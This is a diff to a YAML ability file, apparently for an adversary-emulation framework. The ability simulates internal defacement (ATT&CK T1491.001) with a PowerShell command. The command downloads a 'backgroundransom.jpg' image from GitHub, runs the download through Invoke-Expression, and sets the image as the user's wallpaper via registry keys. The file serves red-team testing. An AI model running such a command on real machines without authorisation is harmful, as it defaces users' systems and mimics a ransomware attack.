@@ -1,36 +1,38 @@
-- executors:
-  - code: null
-    build_target: null
+- buckets:
+  - impact
+  delete_payload: true
+  plugin: ''
+  technique_id: T1491.001
+  description: 'Downloads an image from a GitHUB and change it, to define as wallpaper. '
+  repeatable: false
+  privilege: ''
+  tactic: impact
+  name: change user Wallpaper
+  additional_info: {}
+  technique_name: 'Defacement: Internal Defacement'
+  executors:
+  - build_target: null
+    cleanup: []
+    parsers: []
+    uploads: []
+    variations: []
+    timeout: 60
+    payloads: []
+    code: null
+    name: psh
+    additional_info: {}
+    platform: windows
     command: "$DestinationFile = \"$env:USERPROFILE\\Documents\\backgroundransom.jpg\"\
       ;\n$DownloadURL=\"https://raw.githubusercontent.com/JimBenna/fakedocs/main/backgroundransom.jpg\"\
       ;\n$CompleteCommand= \"curl\"+\" $DownloadURL\"+\" -outfile \"+\"$DestinationFile\"\
       ;\nInvoke-Expression  $CompleteCommand;\n$MyWallpaper=\"$DestinationFile\";\n\
       Function Set-WallPaper($Value) {\n    Set-ItemProperty -path 'HKCU:\\Control\
-      \ Panel\\Desktop\\' -name wallpaper -value $value\n    rundll32.exe user32.dll,\
-      \ UpdatePerUserSystemParameters}\nSet-WallPaper -value \"$MyWallpaper\";"
-    payloads: []
-    uploads: []
-    name: psh
-    parsers: []
-    variations: []
+      \ Panel\\Desktop\\' -name wallpaper -value $value;\n    Set-ItemProperty -path\
+      \ 'HKCU:\\Control Panel\\Desktop\\' -name WallpaperStyle -value 2;\n    rundll32.exe\
+      \ user32.dll, UpdatePerUserSystemParameters}\nSet-WallPaper -value \"$MyWallpaper\"\
+      ;"
     language: null
-    cleanup: []
-    additional_info: {}
-    platform: windows
-    timeout: 60
   access: {}
-  technique_id: T1491.001
-  description: 'Downloads an image from a GitHUB and change it, to define as wallpaper. '
-  repeatable: false
-  buckets:
-  - impact
   singleton: false
-  name: change user Wallpaper
-  plugin: ''
   requirements: []
-  delete_payload: true
-  tactic: impact
-  technique_name: 'Defacement: Internal Defacement'
-  privilege: ''
-  additional_info: {}
   id: change_desktop_background
